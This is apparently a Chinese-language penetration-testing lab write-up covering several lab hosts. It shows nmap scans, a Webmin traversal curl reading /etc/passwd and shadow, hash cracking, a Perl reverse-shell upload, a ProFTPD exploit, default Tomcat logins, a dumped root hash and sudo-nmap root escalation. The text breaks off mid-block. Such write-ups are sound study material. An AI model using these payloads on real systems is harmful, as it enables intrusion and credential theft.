<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 10.11.1.141</span><br><span class="line">Host is up (0.32s latency).</span><br><span class="line">Not shown: 65532 closed ports</span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">22/tcp    open  ssh     OpenSSH 4.0 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 fe:cd:bb:f6:36:d4:59:62:92:b4:10:e4:75:04:43:54 (DSA)</span><br><span class="line">|_  1024 9a:99:25:75:ac:04:e5:f9:f7:21:c6:f5:88:4f:12:6a (RSA)</span><br><span class="line">111/tcp   open  rpcbind 2 (RPC #100000)</span><br><span class="line">10000/tcp open  http    MiniServ 0.01 (Webmin httpd)</span><br><span class="line">|_http-title: Site doesn&apos;t have a title (text/html; Charset=iso-8859-1).</span><br><span class="line">MAC Address: 00:50:56:B8:6A:E6 (VMware)</span><br><span class="line">Device type: firewall|general purpose|proxy server|WAP|PBX|media device|storage-misc</span><br><span class="line">Running (JUST GUESSING): Linux 2.6.X (93%), Cisco embedded (93%), Riverbed embedded (93%), Ruckus embedded (91%), FreeBSD 6.X (89%), Sony embedded (89%), Dell embedded (88%)</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/h:cisco:sa520 cpe:/h:riverbed:steelhead_200 cpe:/h:ruckus:7363 cpe:/h:cisco:uc320w cpe:/o:freebsd:freebsd:6.2 cpe:/h:dell:dr4100</span><br><span class="line">Aggressive OS guesses: Cisco SA520 firewall (Linux 2.6) (93%), Linux 2.6.9 - 2.6.27 (93%), Riverbed Steelhead 200 proxy server (93%), Linux 2.6.18 (93%), Linux 2.6.9 (93%), Linux 2.6.28 (92%), Linux 2.6.30 (92%), Ruckus 7363 WAP (91%), Linux 2.6.11 (90%), Linux 2.6.32 (90%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 1331.40 seconds</span><br></pre></td></tr></table></figure>
<p>看起來蠻單一的</p>
<p>然後<code>MiniServ 0.01</code> 有這個POC可以用<br><a href="https://www.exploit-db.com/exploits/2017" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/2017</a></p>
<p>一行POC:<br><code>curl http://10.11.1.141:10000/unauthenticated//..%01/..%01/..%01/..%01/..%01/etc/passwd</code></p>
<p>我們可以直接看他的 <code>passwd</code> 和 <code>shadow</code><br>阿因為passwd沒啥有趣的，所以我只貼 <code>shadow</code></p>
<p><img src="https://i.imgur.com/4qdsWWF.png" alt=""></p>
<p>把三組密碼拿去爆破<br>成功爆出alice的密碼</p>
<p><img src="https://i.imgur.com/VaWPlSr.png" alt=""></p>
<p>再來就可以 ssh 登入了</p>
<p>查了下 miniserv</p>
<p><a href="http://www.ctohome.com/FuWuQi/5b/636.html" target="_blank" rel="noopener">http://www.ctohome.com/FuWuQi/5b/636.html</a></p>
<p>然後又找到了這個<br><a href="https://www.cnblogs.com/xiaoxiaoleo/p/8452767.html" target="_blank" rel="noopener">https://www.cnblogs.com/xiaoxiaoleo/p/8452767.html</a></p>
<p>原來這個洞不只可以lfi，也可以RCE</p>
<p><code>We can get a shell if we can upload a file.
Upload a Perl reverse shell to /tmp/Reverse.cgi, and add execute privilege:</code></p>
<p>就….死馬當活馬醫看看吧<br>reverse shell 就拿這個吧<br><a href="http://pentestmonkey.net/tools/web-shells/perl-reverse-shell" target="_blank" rel="noopener">http://pentestmonkey.net/tools/web-shells/perl-reverse-shell</a></p>
<p>下載後根據上面說的記得要改成 <code>.cgi</code></p>
<p>把它改一改，放進<code>/tmp</code>並且 <code>chmod 777 aaa.cgi</code><br>local端聽 port </p>
<p>然後…<br><img src="https://i.imgur.com/ZkPbwnX.png" alt=""></p>
<p><img src="https://i.imgur.com/nu6ZFiN.png" alt=""></p>
<p>我還以為這個權限會更低耶…像apache那樣</p>
<h2 id="10-11-1-146"><a href="#10-11-1-146" class="headerlink" title="10.11.1.146"></a>10.11.1.146</h2><p>nmap<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-19 22:48 CST</span><br><span class="line">Stats: 0:00:01 elapsed; 0 hosts completed (0 up), 1 undergoing ARP Ping Scan</span><br><span class="line">ARP Ping Scan Timing: About 100.00% done; ETC: 22:48 (0:00:00 remaining)</span><br><span class="line">Stats: 0:00:07 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan</span><br><span class="line">SYN Stealth Scan Timing: About 5.50% done; ETC: 22:50 (0:01:43 remaining)</span><br><span class="line">Stats: 0:15:53 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan</span><br><span class="line">SYN Stealth Scan Timing: About 82.48% done; ETC: 23:07 (0:03:22 remaining)</span><br><span class="line">Nmap scan report for 10.11.1.146</span><br><span class="line">Host is up (0.37s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     ProFTPD 1.3.3a</span><br><span class="line">22/tcp open  ssh     OpenSSH 5.5p1 Debian 6 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 bb:1e:db:11:2a:c7:90:96:e8:0f:f1:ce:aa:14:6a:c1 (DSA)</span><br><span class="line">|_  2048 67:62:39:ab:ef:7b:2d:e2:70:18:fd:7d:3d:65:bf:c7 (RSA)</span><br><span class="line">MAC Address: 00:50:56:B8:D1:28 (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 2.6.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:2.6.32</span><br><span class="line">OS details: Linux 2.6.32</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 1165.29 seconds</span><br></pre></td></tr></table></figure></p>
<p>看起來答案很明顯了</p>
<p><a href="https://github.com/Muhammd/ProFTPD-1.3.3a/blob/master/ProFTPD_exploit.py" target="_blank" rel="noopener">https://github.com/Muhammd/ProFTPD-1.3.3a/blob/master/ProFTPD_exploit.py</a></p>
<p>替換 shellcode</p>
<p><img src="https://i.imgur.com/b7eNU0G.png" alt=""></p>
<p>記得 handler要用一樣的payload去聽<br><img src="https://i.imgur.com/BBPixIQ.png" alt=""></p>
<p>跑起:<br><img src="https://i.imgur.com/2hnRTp8.png" alt=""></p>
<p><img src="https://i.imgur.com/ahaEGtV.png" alt=""></p>
<h2 id="10-11-1-202"><a href="#10-11-1-202" class="headerlink" title="10.11.1.202"></a>10.11.1.202</h2><p>nmap<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 10.11.1.202</span><br><span class="line">Host is up (0.38s latency).</span><br><span class="line">Not shown: 65511 closed ports</span><br><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">21/tcp   open  ftp           Microsoft ftpd 5.0</span><br><span class="line">|_ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">| ftp-syst: </span><br><span class="line">|_  SYST: Windows_NT version 5.0</span><br><span class="line">80/tcp   open  http          Microsoft IIS httpd 5.0</span><br><span class="line">| http-cookie-flags: </span><br><span class="line">|   /: </span><br><span class="line">|     ASPSESSIONIDQSDTQDAS: </span><br><span class="line">|_      httponly flag not set</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH</span><br><span class="line">|_http-server-header: Microsoft-IIS/5.0</span><br><span class="line">|_http-title: Under Construction</span><br><span class="line">| http-webdav-scan: </span><br><span class="line">|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH</span><br><span class="line">|   Server Type: Microsoft-IIS/5.0</span><br><span class="line">|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK</span><br><span class="line">|   Server Date: Wed, 26 Feb 2020 16:03:17 GMT</span><br><span class="line">|_  WebDAV type: Unknown</span><br><span class="line">135/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">443/tcp  open  https?</span><br><span class="line">445/tcp  open  microsoft-ds  Windows 2000 microsoft-ds</span><br><span class="line">1029/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">1033/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">1034/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">1038/tcp open  oracle        Oracle Database</span><br><span class="line">1521/tcp open  oracle-tns    Oracle TNS Listener 9.2.0.1.0 (for 32-bit Windows)</span><br><span class="line">1748/tcp open  oracle-tns    Oracle TNS Listener</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   oracle-tns: </span><br><span class="line">|_    (CONNECT_DATA=(COMMAND=version))</span><br><span class="line">1754/tcp open  oracle        Oracle Database</span><br><span class="line">1808/tcp open  oracle-vp2?</span><br><span class="line">1809/tcp open  oracle-vp1?</span><br><span class="line">2030/tcp open  oracle-mts    Oracle MTS Recovery Service</span><br><span class="line">2100/tcp open  ftp           Oracle Enterprise XML DB ftpd 9.2.0.1.0</span><br><span class="line">| ftp-syst: </span><br><span class="line">|_  SYST: Unix Type:9.2.0.1 Version:Oracle XML DB </span><br><span class="line">3339/tcp open  http          Oracle HTTP Server Powered by Apache 1.3.22 (mod_plsql/3.0.9.8.3b mod_ssl/2.8.5 OpenSSL/0.9.6b mod_fastcgi/2.2.12 mod_oprocmgr/1.0 mod_perl/1.25)</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Oracle HTTP Server Powered by Apache/1.3.22 (Win32) mod_plsql/3.0.9.8.3b mod_ssl/2.8.5 OpenSSL/0.9.6b mod_fastcgi/2.2.12 mod_oprocmgr/1.0 mod_perl/1.25</span><br><span class="line">|_http-title: Welcome to Oracle Enterprise Manager</span><br><span class="line">3372/tcp open  msdtc         Microsoft Distributed Transaction Coordinator</span><br><span class="line">3389/tcp open  ms-wbt-server Microsoft Terminal Services</span><br><span class="line">4443/tcp open  ssl/pharos?</span><br><span class="line">|_ssl-date: 2020-02-26T16:04:17+00:00; -18m45s from scanner time.</span><br><span class="line">| sslv2: </span><br><span class="line">|   SSLv2 supported</span><br><span class="line">|   ciphers: </span><br><span class="line">|     SSL2_RC4_128_WITH_MD5</span><br><span class="line">|     SSL2_RC4_64_WITH_MD5</span><br><span class="line">|     SSL2_DES_192_EDE3_CBC_WITH_MD5</span><br><span class="line">|     SSL2_DES_64_CBC_WITH_MD5</span><br><span class="line">|_    SSL2_RC4_128_EXPORT40_WITH_MD5</span><br><span class="line">7778/tcp open  http          Oracle HTTP Server Powered by Apache 1.3.22 (mod_plsql/3.0.9.8.3b mod_ssl/2.8.5 OpenSSL/0.9.6b mod_fastcgi/2.2.12 mod_oprocmgr/1.0 mod_perl/1.25)</span><br><span class="line">|_http-generator: Mozilla/4.72 [en] (WinNT; U) [Netscape]</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Oracle HTTP Server Powered by Apache/1.3.22 (Win32) mod_plsql/3.0.9.8.3b mod_ssl/2.8.5 OpenSSL/0.9.6b mod_fastcgi/2.2.12 mod_oprocmgr/1.0 mod_perl/1.25</span><br><span class="line">|_http-title: Oracle HTTP Server Index</span><br><span class="line">8080/tcp open  http          Oracle XML DB Enterprise Edition httpd 9.2.0.1.0 (Oracle9i Enterprise Edition Release)</span><br><span class="line">| http-auth: </span><br><span class="line">| HTTP/1.1 401 Unauthorized\x0D</span><br><span class="line">|_  Basic realm=XDB</span><br><span class="line">|_http-server-header: Oracle XML DB/Oracle9i Enterprise Edition Release 9.2.0.1.0 - Production</span><br><span class="line">|_http-title: 401 Unauthorized</span><br><span class="line">8228/tcp open  unknown</span><br><span class="line">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="line">SF-Port1748-TCP:V=7.80%I=7%D=2/27%Time=5E569A74%P=x86_64-pc-linux-gnu%r(or</span><br><span class="line">SF:acle-tns,2C,&quot;\0,\0\0\x04\0\0\0\&quot;\0\0\x20\(CONNECT_DATA=\(COMMAND=versio</span><br><span class="line">SF:n\)\)&quot;);</span><br><span class="line">MAC Address: 00:50:56:B8:F7:96 (VMware)</span><br><span class="line">No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span><br><span class="line">TCP/IP fingerprint:</span><br><span class="line">OS:SCAN(V=7.80%E=4%D=2/27%OT=21%CT=1%CU=38548%PV=Y%DS=1%DC=D%G=Y%M=005056%T</span><br><span class="line">OS:M=5E569C1C%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10C%TI=I%II=I%SS=S</span><br><span class="line">OS:%TS=0)SEQ(SP=101%GCD=1%ISR=10C%II=I%TS=0)OPS(O1=M529NW0NNT00NNS%O2=M529N</span><br><span class="line">OS:W0NNT00NNS%O3=M529NW0NNT00%O4=M529NW0NNT00NNS%O5=M529NW0NNT00NNS%O6=M529</span><br><span class="line">OS:NNT00NNS)WIN(W1=FAF0%W2=FAF0%W3=FAF0%W4=FAF0%W5=FAF0%W6=FAF0)ECN(R=Y%DF=</span><br><span class="line">OS:Y%T=80%W=FAF0%O=M529NW0NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q</span><br><span class="line">OS:=)T2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=N%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(</span><br><span class="line">OS:R=N)T7(R=N)U1(R=Y%DF=N%T=80%IPL=38%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=</span><br><span class="line">OS:G)IE(R=Y%DFI=S%T=80%CD=Z)</span><br><span class="line"></span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: Host: oracle; OSs: Windows, Windows 2000, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_2000, cpe:/o:microsoft:windows_xp</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: -58m42s, deviation: 1h09m12s, median: -18m45s</span><br><span class="line">|_nbstat: NetBIOS name: ORACLE, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:50:56:b8:f7:96 (VMware)</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows 2000 (Windows 2000 LAN Manager)</span><br><span class="line">|   OS CPE: cpe:/o:microsoft:windows_2000::-</span><br><span class="line">|   Computer name: oracle</span><br><span class="line">|   NetBIOS computer name: ORACLE\x00</span><br><span class="line">|   Domain name: acme.local</span><br><span class="line">|   FQDN: oracle.acme.local</span><br><span class="line">|_  System time: 2020-02-26T18:03:22+02:00</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">|_smb2-time: Protocol negotiation failed (SMB2)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 1759.18 seconds</span><br></pre></td></tr></table></figure></p>
<p>windows 2000, 445 port open<br>checker:<br><img src="https://i.imgur.com/JJVxPFM.png" alt=""><br>再來就不多說只貼圖<br><img src="https://i.imgur.com/Z2xqFNw.png" alt=""></p>
<p><img src="https://i.imgur.com/mhCSojF.png" alt=""></p>
<p><img src="https://i.imgur.com/xPL9rbc.png" alt=""></p>
<h2 id="10-11-1-209"><a href="#10-11-1-209" class="headerlink" title="10.11.1.209"></a>10.11.1.209</h2><p>nmap<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 10.11.1.209</span><br><span class="line">Host is up (0.38s latency).</span><br><span class="line">Not shown: 65530 closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     SunSSH 1.1.5 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 b0:d1:14:4f:d2:43:20:e4:90:f7:ca:e3:8a:36:39:86 (DSA)</span><br><span class="line">|_  1024 dd:36:f6:09:23:4c:c4:c3:44:d6:6e:2f:6a:ff:b3:12 (RSA)</span><br><span class="line">80/tcp   open  http    Apache httpd 1.3.41 ((Unix) mod_perl/1.31)</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Apache/1.3.41 (Unix) mod_perl/1.31</span><br><span class="line">|_http-title: Test Page for the SSL/TLS-aware Apache Installation on Web Site</span><br><span class="line">111/tcp  open  rpcbind 2-4 (RPC #100000)</span><br><span class="line">8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)</span><br><span class="line">|_ajp-methods: Failed to get a valid response for the OPTION request</span><br><span class="line">8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">|_http-favicon: Apache Tomcat</span><br><span class="line">|_http-open-proxy: Proxy might be redirecting requests</span><br><span class="line">|_http-server-header: Apache-Coyote/1.1</span><br><span class="line">|_http-title: Apache Tomcat/5.5.35</span><br><span class="line">MAC Address: 00:50:56:B8:27:FD (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Sun SunOS 10</span><br><span class="line">OS CPE: cpe:/o:sun:sunos:10</span><br><span class="line">OS details: Sun Solaris 10</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 2372.17 seconds</span><br></pre></td></tr></table></figure></p>
<p><code>Apache/1.3.41 (Unix) mod_perl/1.31</code> 我摸了一陣子只有XSS，看起來應該沒搞頭</p>
<p>然後他的path有開 <code>cgi-bin/test-cgi</code> 和 <code>cgi-bin/printenv</code></p>
<p>但也沒辦法 shellshock</p>
<p>比較有趣的是 8080 有一個tomcat<br><img src="https://i.imgur.com/PH34NiI.png" alt=""></p>
<p>其中裡面的<br><code>http://10.11.1.209:8080/admin/</code><br>我試了幾個default login失敗就被ban了==</p>
<p>最後用 nmap -sC –script vuln -p8080</p>
<p>得知除了 <code>admin</code> 之外還有 <code>manager</code></p>
<p>可以試看看</p>
<p>只要用無痕就可以無限try帳密<br>準備了 default login<br><a href="https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown" target="_blank" rel="noopener">https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown</a></p>
<p>最後try到 tomcat/tomcat<br>或是用 <code>nikto</code><br><img src="https://i.imgur.com/vmr3yAr.png" alt=""></p>
<p>進去後:<br><img src="https://i.imgur.com/Pk7m1Z3.png" alt=""></p>
<p>最後就follow這篇<br><a href="https://www.hackingarticles.in/multiple-ways-to-exploit-tomcat-manager/" target="_blank" rel="noopener">https://www.hackingarticles.in/multiple-ways-to-exploit-tomcat-manager/</a><br><img src="https://i.imgur.com/jnF3rjp.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls /root</span><br><span class="line">/root: No such file or directory</span><br></pre></td></tr></table></figure></p>
<p>找了下才找到 proof.txt<br><img src="https://i.imgur.com/zuYFanh.png" alt=""></p>
<h2 id="10-11-1-217"><a href="#10-11-1-217" class="headerlink" title="10.11.1.217"></a>10.11.1.217</h2><p>web page<br><img src="https://i.imgur.com/5Uc8y2B.png" alt=""><br>跟HTB的靶機一模一樣<br>看了LFI進去後感覺沒啥東西<br>他的password就是預設的admin<br>於是嘗試另一個RCE的洞<br><a href="https://www.exploit-db.com/exploits/18650" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/18650</a><br>拿到shell後跑了 LinEnum.sh<br>看到有趣的東西<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[+] We can read the shadow file!</span><br><span class="line">root:$1$uF5XC.Im$8k0Gkw4wYaZkNzuOuySIx/:16902:0:99999:7:::</span><br><span class="line">vcsa:!!:15422:0:99999:7:::</span><br><span class="line">pcap:!!:15422:0:99999:7:::</span><br><span class="line">ntp:!!:15422:0:99999:7:::</span><br><span class="line">cyrus:!!:15422:0:99999:7:::</span><br><span class="line">dbus:!!:15422:0:99999:7:::</span><br><span class="line">apache:!!:15422:0:99999:7:::</span><br><span class="line">mailman:!!:15422:0:99999:7:::</span><br><span class="line">rpc:!!:15422:0:99999:7:::</span><br><span class="line">postfix:!!:15422:0:99999:7:::</span><br><span class="line">asterisk:!!:15422:0:99999:7:::</span><br><span class="line">rpcuser:!!:15422:0:99999:7:::</span><br><span class="line">nfsnobody:!!:15422:0:99999:7:::</span><br><span class="line">sshd:!!:15422:0:99999:7:::</span><br><span class="line">spamfilter:!!:15422:0:99999:7:::</span><br><span class="line">haldaemon:!!:15422:0:99999:7:::</span><br><span class="line">xfs:!!:15422:0:99999:7:::</span><br></pre></td></tr></table></figure></p>
<p>但拿去爆 rockyou都沒東西<br>於是轉向去看 <code>sudo -l</code><br>果真有東西<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br><span class="line">Matching Defaults entries for asterisk on this host:</span><br><span class="line">    env_reset, env_keep=&quot;COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR</span><br><span class="line">    LS_COLORS MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE LC_COLLATE</span><br><span class="line">    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES LC_MONETARY LC_NAME LC_NUMERIC</span><br><span class="line">    LC_PAPER LC_TELEPHONE LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET</span><br><span class="line">    XAUTHORITY&quot;</span><br><span class="line"></span><br><span class="line">User asterisk may run the following commands on this host:</span><br><span class="line">    (root) NOPASSWD: /sbin/shutdown</span><br><span class="line">    (root) NOPASSWD: /usr/bin/nmap</span><br><span class="line">    (root) NOPASSWD: /usr/bin/yum</span><br><span class="line">    (root) NOPASSWD: /bin/touch</span><br><span class="line">    (root) NOPASSWD: /bin/chmod</span><br><span class="line">    (root) NOPASSWD: /bin/chown</span><br><span class="line">    (root) NOPASSWD: /sbin/service</span><br><span class="line">    (root) NOPASSWD: /sbin/init</span><br><span class="line">    (root) NOPASSWD: /usr/sbin/postmap</span><br><span class="line">    (root) NOPASSWD: /usr/sbin/postfix</span><br><span class="line">    (root) NOPASSWD: /usr/sbin/saslpasswd2</span><br><span class="line">    (root) NOPASSWD: /usr/sbin/hardware_detector</span><br><span class="line">    (root) NOPASSWD: /sbin/chkconfig</span><br><span class="line">    (root) NOPASSWD: /usr/sbin/elastix-helper</span><br></pre></td></tr></table></figure></p>
<p>從 <code>GTFOBins</code> 可以得知nmap可以拿 shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap --interactive</span><br><span class="line"></span><br><span class="line">Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ )</span><br><span class="line">Welcome to Interactive Mode -- press h &lt;enter&gt; for help</span><br><span class="line">nmap&gt; !sh</span><br><span class="line">!sh</span><br><span class="line">sh-3.2# whoami</span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line">sh-3.2# cd /root</span><br><span class="line">cd /root</span><br><span 